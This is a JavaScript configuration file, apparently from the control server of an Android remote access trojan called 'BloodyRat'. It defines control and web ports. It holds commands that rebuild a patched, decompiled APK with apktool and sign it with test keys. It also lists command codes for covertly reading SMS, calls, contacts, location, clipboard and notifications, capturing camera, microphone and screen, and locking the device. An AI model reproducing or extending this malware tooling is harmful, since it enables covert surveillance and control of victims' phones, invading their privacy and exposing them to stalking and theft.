const path = require('path');

exports.debug = false;

exports.web_port = 22533;
exports.control_port = 22222;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
exports.apkBuildSign = path.join(__dirname, '../assets/webpublic/build.s.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/BloodyRat.apk')

exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)

exports.testkey509 = path.join(__dirname, '../app/factory/', 'testkey.x509.pem');
exports.testkeypk8 = path.join(__dirname, '../app/factory/', 'testkey.pk8');

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'signapk.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/justhack/hackapk/IOSocket.smali');

exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
//exports.signCommand = 'java -jar "' + exports.apkSign + '" ' + exports.testkey509 + '" ' + exports.testkeypk8 + '" ' + exports.apkBuildPath + '" ' + '"';
exports.signCommand = 'java -jar "' + exports.apkSign + '" ' + exports.testkey509 + ' ' + exports.testkeypk8 + ' ' + exports.apkBuildPath + ' ' + exports.apkBuildSign;



exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP',
    lockDevice: '0xLD',
    screenShot: '0xSS',
    screenRecord: '0xSR',
    rearCam: '0xRC',
    frontCam: '0xFC'
}

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}
